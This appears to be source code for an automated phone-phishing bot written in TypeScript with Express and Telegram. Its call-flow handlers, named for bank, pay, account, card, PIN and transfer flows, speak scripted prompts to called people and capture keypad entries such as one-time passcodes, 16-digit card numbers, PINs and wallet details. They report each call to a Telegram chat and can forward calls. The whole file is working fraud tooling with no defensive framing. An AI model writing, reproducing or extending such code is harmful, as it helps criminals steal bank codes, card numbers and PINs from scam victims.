/* eslint-disable @typescript-eslint/no-explicit-any */
import { Response } from 'express';
import { bot } from '..';
import { v4 as uuidv4 } from 'uuid';
import { getLangDTMFFlow } from '../languages';
import { Language } from '../types';

export const bankFlow = async (
  dtmf: string,
  res: Response,
  language: Language,
  chatId: number | undefined,
  step: string,
  destination: string,
  otpLength: number,
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
): Promise<Response<any, Record<string, any>>> => {
  if (dtmf && dtmf === '1') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );

    return res.json({
      id: uuidv4(),
      title: `call BANK FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangDTMFFlow({ dtmf, language, step }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '2') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );

    return res.json({
      id: uuidv4(),
      title: `call BANK FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangDTMFFlow({ dtmf, language, step }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '3') {
    return res.json({
      id: uuidv4(),
      title: `call BANK FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangDTMFFlow({ dtmf, language, step }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?otpLength=${otpLength}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '*') {
    return res.json({
      id: uuidv4(),
      title: `call BANK FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangDTMFFlow({ dtmf, language, step }),
            language,
            voice: 'female',
          },
        },
      ],
    });
  } else {
    return res.json({
      id: uuidv4(),
      title: `call BANK FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangDTMFFlow({ dtmf, language, step }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?otpLength=${otpLength}`,
          },
        },
      ],
    });
  }
};

export const payFlow = async (
  dtmf: string,
  res: Response,
  language: Language,
  chatId: number | undefined,
  step: string,
  destination: string,
  otpLength: number,
  wallet?: string,
): Promise<Response<any, Record<string, any>>> => {
  if (dtmf && dtmf === '1') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );

    return res.json({
      id: uuidv4(),
      title: `call PAY FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangDTMFFlow({ dtmf, language, step, wallet }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '2') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );
    return res.json({
      id: uuidv4(),
      title: `call PAY FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangDTMFFlow({ dtmf, language, step, wallet }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '3') {
    return res.json({
      id: uuidv4(),
      title: `call PAY FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangDTMFFlow({ dtmf, language, step, wallet }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${
              process.env.ENDPOINT_URL
            }/calls/dtmf/${language}/${step}/${chatId}?wallet=${wallet
              ?.replace(/\s/g, '')
              .toLowerCase()}?otpLength=${otpLength}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '*') {
    return res.json({
      id: uuidv4(),
      title: `call PAY FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangDTMFFlow({ dtmf, language, step, wallet }),
            language,
            voice: 'female',
          },
        },
      ],
    });
  } else {
    return res.json({
      id: uuidv4(),
      title: `call PAY FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangDTMFFlow({ dtmf, language, step, wallet }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${
              process.env.ENDPOINT_URL
            }/calls/dtmf/${language}/${step}/${chatId}?wallet=${wallet
              ?.replace(/\s/g, '')
              .toLowerCase()}?otpLength=${otpLength}`,
          },
        },
      ],
    });
  }
};

export const accountFlow = async (
  dtmf: string,
  res: Response,
  language: Language,
  chatId: number | undefined,
  step: string,
  destination: string,
  otpLength: number,
  askCardInfo?: string,
): Promise<Response<any, Record<string, any>>> => {
  if (dtmf && dtmf === '1') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );
    return res.json({
      id: uuidv4(),
      title: `call PAY FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangDTMFFlow({ dtmf, language, step }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}&askCardInfo=${askCardInfo}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '2') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );

    return res.json({
      id: uuidv4(),
      title: `call PAY FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangDTMFFlow({ dtmf, language, step }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?otpLength=${otpLength}&askCardInfo=${askCardInfo}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '3') {
    return res.json({
      id: uuidv4(),
      title: `call PAY FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangDTMFFlow({ dtmf, language, step }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?otpLength=${otpLength}&askCardInfo=${askCardInfo}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '*') {
    return res.json({
      id: uuidv4(),
      title: `call PAY FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangDTMFFlow({ dtmf, language, step }),
            language,
            voice: 'female',
          },
        },
      ],
    });
  } else {
    return res.json({
      id: uuidv4(),
      title: `call PAY FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangDTMFFlow({ dtmf, language, step }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: Number(otpLength),
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?otpLength=${otpLength}&askCardInfo=${askCardInfo}`,
          },
        },
      ],
    });
  }
};

export const cardFlow = async (
  dtmf: string,
  res: Response,
  language: Language,
  chatId: number | undefined,
  step: string,
  destination: string,
  cardType: string,
): Promise<Response<any, Record<string, any>>> => {
  if (dtmf && dtmf === '1') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );
    return res.json({
      id: uuidv4(),
      title: `call CARD FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangDTMFFlow({ dtmf, language, step, cardType }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 16,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 16,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '2') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );
    return res.json({
      id: uuidv4(),
      title: `call CARD FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangDTMFFlow({ dtmf, language, step, cardType }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 16,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 16,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/otp/${step}/${chatId}/${language}?cardType=${cardType}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '3') {
    return res.json({
      id: uuidv4(),
      title: `call CARD FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangDTMFFlow({ dtmf, language, step, cardType }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 16,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 16,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?cardType=${cardType}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '*') {
    return res.json({
      id: uuidv4(),
      title: `call PAY FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangDTMFFlow({ dtmf, language, step, cardType }),
            language,
            voice: 'female',
          },
        },
      ],
    });
  } else {
    return res.json({
      id: uuidv4(),
      title: `call CARD FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangDTMFFlow({ dtmf, language, step, cardType }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 16,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 16,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?cardType=${cardType}`,
          },
        },
      ],
    });
  }
};

export const pinFlow = async (
  dtmf: string,
  res: Response,
  language: Language,
  chatId: number | undefined,
  step: string,
  destination: string,
  pinType: string,
): Promise<Response<any, Record<string, any>>> => {
  if (dtmf && dtmf === '1') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );
    return res.json({
      id: uuidv4(),
      title: `call CARD FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangDTMFFlow({ dtmf, language, step, pinType }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '2') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );
    return res.json({
      id: uuidv4(),
      title: `call CARD FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangDTMFFlow({ dtmf, language, step, pinType }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/pins/${step}/${chatId}/${language}?pinType=${pinType}`,
          },
        },
      ],
    });
  } else if (dtmf && dtmf === '3') {
    return res.json({
      id: uuidv4(),
      title: `call CARD FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangDTMFFlow({ dtmf, language, step, pinType }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/pins/${language}/${step}/${chatId}?pinType=${pinType}`,
          },
        },
      ],
    });
  } else {
    return res.json({
      id: uuidv4(),
      title: `call CARD FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangDTMFFlow({ dtmf, language, step, pinType }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 8,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/pins/${language}/${step}/${chatId}?pinType=${pinType}`,
          },
        },
      ],
    });
  }
};

export const pgpFlow = async (
  dtmf: string,
  res: Response,
  language: Language,
  chatId: number | undefined,
  step: string,
  destination: string,
  transferNumber: string,
  institutionName: string,
  from: string,
): Promise<Response<any, Record<string, any>>> => {
  if (dtmf && dtmf === '1') {
    await bot.telegram.sendMessage(
      Number(chatId),
      `On call (${destination}) 🤳🏽`,
      {
        parse_mode: 'HTML',
      },
    );

    return res.json({
      id: uuidv4(),
      title: `${chatId} - Forward call to ${transferNumber}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'transfer',
          options: {
            source: from,
            destination: transferNumber,
          },
        },
      ],
    });
  } else {
    return res.json({
      id: uuidv4(),
      title: `call CARD FLOW - ${chatId}`,
      record: false,
      steps: [
        {
          id: uuidv4(),
          action: 'say',
          options: {
            payload: getLangDTMFFlow({ dtmf, language, step, institutionName }),
            language,
            voice: 'female',
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 1,
        },
        {
          id: uuidv4(),
          action: 'pause',
          options: {
            length: 5,
          },
          onKeypressGoto: 'nextStepGoto',
          onKeypressVar: 'dtmf',
          endKey: '#',
          maxNumKeys: 1,
        },
        {
          id: 'nextStepGoto',
          action: 'fetchCallFlow',
          options: {
            url: `${process.env.ENDPOINT_URL}/calls/dtmf/${language}/${step}/${chatId}?transferNumber=${transferNumber}&from=${from}`,
          },
        },
      ],
    });
  }
};
